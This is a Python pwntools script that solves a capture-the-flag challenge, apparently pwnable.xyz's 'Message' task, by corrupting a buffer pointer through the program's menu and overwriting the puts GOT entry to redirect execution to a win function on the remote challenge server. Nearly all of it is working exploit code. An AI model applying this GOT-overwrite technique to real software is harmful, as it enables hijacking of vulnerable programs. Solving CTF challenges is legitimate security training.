from pwn import *

# Pwnable.xyz Message challenge
# 100 points

"""
Fill in the missing...
Menu:
1. Letters.
2. Numbers.
3. Handles.
4. Words.
5. Save progress.
> 
"""

context(kernel="amd64", arch="amd64")


# 256 bytes

def save_progress(p, size: int, data: bytes):
	p.sendlineafter(b">", b"5")
	if size != 0:
		p.sendafter(b"Size:", str(size).encode("utf-8"))
	p.send(data)

def fill_space(p):
	# Send "grazfather" init string
	p.sendlineafter(b">", b"3")
	p.sendlineafter(b"> ", b"10")
	p.sendlineafter(b"> ", b"3")

	# Send repeated string " is a neural-network machine-learning AI."
	for _ in range(6):
		p.sendlineafter(b"> ", b"3")
		p.sendlineafter(b"> ", b"3")
		p.sendlineafter(b"> ", b"10")


def main():
	e = ELF("challenge")
	env = dict(os.environ)
	# env["LD_PRELOAD"] = "./ld.so.2 ./libc.so.6"
	if 0:
		p = process("./challenge", env=env)
		# gdb.attach(p)
	elif 0:
		p = process(["strace", "-o", "strace.out", "./challenge"])
	else:
		p = remote("svc.pwnable.xyz", 30036)

	win_addr = e.symbols["win"]
	puts_got = e.got["puts"]


	# Set buf pointer to reserve
	save_progress(p, -1, b"DDDDDDDDDDDD")

	# Overwrite lower address of the buff pointer
	fill_space(p)

	# Now fully overwrite buf address
	save_progress(p, 0, b"A"*0xA0+pack(puts_got))


	# Now write to newly-overwritten buffer address
	save_progress(p, 0, pack(win_addr))

	p.sendlineafter(b"> ", b"10000")

	print(p.recvrepeat())
	# p.interactive()


main()